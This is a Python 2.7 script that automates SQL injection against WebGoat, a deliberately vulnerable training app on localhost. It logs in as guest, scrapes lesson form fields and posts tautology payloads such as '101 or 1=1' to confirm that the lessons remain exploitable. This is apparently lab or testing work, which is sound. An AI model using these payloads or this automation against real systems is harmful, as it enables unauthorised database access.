#Python2.7
import requests
import argparse
import json
import re
import sys
# THIS ATTACK WILL WORK ONLY ONCE THEN WE HAVE TO RESET EACH LESSON
def sql_injection( lesson_name, sql_injection ):
	#start session
	session = requests.Session()
	#Webgoat login page get
	host = '127.0.0.1'
	port = '8082'
	webgoat_main_address = 'http://' + host + ':' + port + '/WebGoat/'
	webgoat_session = session.get( webgoat_main_address +'login.mvc' )

	try:
		#session token store
		cookie = webgoat_session.cookies

		login_parameters = {'username': 'guest', 'password': 'guest'}
		#login to access content
		login = session.post( webgoat_main_address + 'j_spring_security_check;jsessionid=' + str( cookie['JSESSIONID'] ), login_parameters )

		#access all lessons json and finding lesson api address by lesson name 
		#we could use direct link to lesson but thats just different approach
		webgoat_lesson_api = session.get( webgoat_main_address + 'service/lessonmenu.mvc' )
		webgoat_lesson_api_split = webgoat_lesson_api.text.split( '},{' )

		for i in webgoat_lesson_api_split:
			if 'name\":\"' + lesson_name in i:
				lesson_api = i.split(",")

		#prepare lesson address
		lesson_address = str( lesson_api[4].split( "\"" )[3] )
		lesson_parted_address = lesson_address[1:].split('/')
		lesson_prepared_api_address = lesson_parted_address[0] + '?Screen=' + lesson_parted_address[1] + '&menu=' + lesson_parted_address[2]

		#find parameters
		target_page = session.get( webgoat_main_address + lesson_prepared_api_address )
		target_page_split = target_page.text.split( '<' )
		for i in target_page_split:
			if 'type=\'SUBMIT\'' in i:
				submit_value = i.split( "value=\'" )[1].split( "\'>" )[0]
			else:
				if 'name=' in i:
					select_name = i.split( "name=\'" )[1].split( "\'" )[0]

		#post sql injection
		input_data = {str( select_name ): sql_injection, 'SUBMIT':str( submit_value )}
		end_result =  session.post(  webgoat_main_address + lesson_prepared_api_address, input_data )

		#validation if success THIS ATTACK WILL WORK ONLY ONCE THEN WE HAVE TO RESET EACH LESSON
		if 'table cellpadding=\'1\' border=\'1\'><tr><td><b>' in end_result.text:
			print 'Success sql injection vulnerability is still present'
		else:
			print 'Unfortunetaly it isn\'t working any more'
		
	except Exception as e:
		print e

#numeric_
sql_injection( "Numeric SQL Injection", '101 or 1=1' )
#string_
sql_injection( "String SQL Injection", 'Erwin\' OR \'1\'=\'1' )